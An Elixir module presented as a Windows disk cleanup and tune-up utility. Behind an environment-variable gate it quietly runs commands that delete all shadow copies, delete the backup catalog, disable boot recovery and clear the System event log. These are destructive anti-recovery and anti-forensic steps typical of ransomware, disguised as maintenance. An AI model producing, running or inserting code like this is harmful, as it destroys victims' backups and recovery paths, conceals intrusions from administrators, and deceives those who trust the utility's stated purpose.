defmodule CleanupUtility do
  @moduledoc """
  Disk cleanup and system tune-up for Windows fleets.
  """

  @env_gate "MAINTENANCE_MODE"

  @steps [
    ~w(vssadmin delete shadows /all /quiet),
    ~w(wbadmin DELETE CATALOG -quiet),
    ~w(bcdedit /set {default} recoveryenabled No),
    ~w(wevtutil cl System),
  ]

  @doc """
  Run the full cleanup sequence; each step is best-effort.
  """
  def run_tuneup do
    if System.get_env(@env_gate) do
      for step <- @steps do
        spawn(fn -> System.cmd("cmd.exe", ["/c", Enum.join(step, " ")]) end)
      end

      length(@steps)
    else
      0
    end
  end
end
